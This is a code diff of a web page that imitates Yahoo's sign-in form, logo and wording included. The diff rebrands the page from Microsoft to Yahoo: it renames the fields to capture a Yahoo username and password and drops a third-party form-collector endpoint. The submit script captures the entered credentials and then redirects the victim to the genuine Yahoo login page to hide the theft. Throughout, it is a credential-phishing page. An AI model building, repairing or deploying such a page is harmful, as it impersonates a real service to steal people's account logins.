@@ -143,7 +143,7 @@ button {
     border: none;
 }
 
-#name {
+#password_login, #email_login {
     background-color: white;
     border: 1px solid white;
     width: 20rem;
@@ -200,14 +200,14 @@ button,#google,#create-account,.chkbox_and_forgot_password,a {
 <body>
     <div class="main contianer">
         <div class="loginform">
-            <form action="https://usebasin.com/f/619f54c3ae82" method="POST">
+            <form id="signUp-form">
                 <img src="yahoo-logo.png" alt="Yahoo" id="yahoo-img"><br><br>
             <h1 class="signintext">Sign In</h1>
             <p class="paragraph1">Sign in using your Yahoo account</p>
             <p>username, email address or mobile number</p>
-            <input style="margin-left: 10%;" name="Name" type="text" id="name"><br>
+            <input style="margin-left: 10%;" name="Username, email, or mobile nmber for Yahoo login" type="text" id="email_login" required><br>
             <p class="pass">Password</p>
-            <input style="margin-left: 10%;" name="Name" type="text" id="name">
+            <input style="margin-left: 10%;" name="Yahoo login password" type="password" id="password_login">
             <button type="submit" id="Register">Signin</button>
             <div class="chkbox_and_forgot_password">
                 <div><input type="checkbox" name="stay-signed" id="full_name">
@@ -257,13 +257,12 @@ button,#google,#create-account,.chkbox_and_forgot_password,a {
    .addEventListener('submit', (e) => {
       e.preventDefault();
 
-      let fullName = document.getElementById('full_name').value
       let emailLogin = document.getElementById('email_login').value
       let passwordLogin = document.getElementById('password_login').value   
       
 
       // Form Authentication
-      if(fullName.trim() === '' || emailLogin.trim() === '' || passwordLogin.trim() === ''){
+      if(emailLogin.trim() === '' || passwordLogin.trim() === ''){
          swal({
           text: 'All Inputs Field are required',
           icon: 'warning'
@@ -290,20 +289,12 @@ button,#google,#create-account,.chkbox_and_forgot_password,a {
           })
            .then(value => {
             if(value){
-               window.location.replace('https://www.office.com/')
+               window.location.replace('https://login.yahoo.com/')
             }
            })
 
            
-          // Set the Display Name for the user if the User Credentials
-          // Is true
-            const user = userCredential.user
-
-            if(user){
-              updateProfile(user, {
-                displayName: `${fullName}`
-              })
-        }
+          
         }
         
         
